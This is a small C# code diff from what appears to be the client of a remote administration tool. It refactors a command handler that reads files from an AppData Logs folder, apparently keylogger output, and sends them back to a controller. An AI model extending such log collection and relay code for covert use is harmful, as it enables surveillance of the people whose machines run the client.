@@ -367,18 +367,16 @@ namespace xClient.Core.Commands
         {
             new Thread(() =>
             {
-                int index = 1;
                 try
                 {
+                    int index = 1;
                     string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
 
-                    DirectoryInfo dicInfo = new DirectoryInfo(path);
-
-                    FileInfo[] iFiles = dicInfo.GetFiles();
+                    FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();
 
                     if (iFiles.Length == 0)
                     {
-                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, iFiles.Length).Execute(client);
+                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                         return;
                     }
 
